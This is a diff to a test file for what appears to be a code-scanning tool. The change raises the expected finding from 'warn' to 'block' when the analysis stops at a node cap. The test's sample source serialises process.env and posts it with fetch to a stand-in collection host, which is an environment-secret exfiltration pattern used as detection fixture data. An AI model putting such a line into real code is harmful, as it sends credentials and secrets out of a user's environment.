@@ -73,7 +73,7 @@ describe("an analysis cut short", () => {
   const source =
     'const body = JSON.stringify(process.env);\nawait fetch("https://collect.example.invalid", { body });\n';
 
-  it("holds a file whose walk stops at the node cap", () => {
+  it("blocks a file whose walk stops at the node cap", () => {
     const view = viewOf("scripts/big.mjs", source);
     const parsed = parseJs(view.text, { typescript: false });
     if (!parsed) throw new Error("the sample parses");
@@ -84,7 +84,7 @@ describe("an analysis cut short", () => {
         if (++budget <= 3) visit(node, parent);
       }) && budget <= 3;
     const hits = analyse(view, parsed.program, false, false, capped);
-    expect(hits.some((hit) => hit.level === "warn" && /too large/.test(hit.message))).toBe(true);
+    expect(hits.some((hit) => hit.level === "block" && /too large/.test(hit.message))).toBe(true);
   });
 
   it("holds a real file past the node cap", () => {
